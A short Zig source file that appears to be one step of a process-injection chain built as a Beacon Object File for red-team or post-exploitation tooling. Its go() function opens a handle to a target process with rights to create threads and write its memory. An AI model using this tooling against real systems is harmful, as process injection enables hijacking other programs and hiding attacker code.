const std = @import("std");
const beacon = @import("bof_api").beacon;
const w32 = @import("bof_api").win32;
const shared = @import("wInjectionChainShared.zig");

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var state: *shared.State = blk: {
        const mem = beacon.dataExtract(&parser, null).?[0..@sizeOf(usize)];
        break :blk @ptrFromInt(std.mem.readInt(usize, mem, .little));
    };

    var obj_attribs = w32.OBJECT.ATTRIBUTES{
        .ObjectName = null,
        .Attributes = .{ .INHERIT = true },
    };
    var client_id = w32.CLIENT_ID{
        .UniqueProcess = @ptrFromInt(state.process_id),
        .UniqueThread = null,
    };
    state.nt_status = w32.NtOpenProcess(
        &state.process_handle,
        .{ .SPECIFIC = .{ .PROCESS = .{ .CREATE_THREAD = true, .VM_OPERATION = true, .VM_WRITE = true } } },
        &obj_attribs,
        &client_id,
    );

    return 0;
}
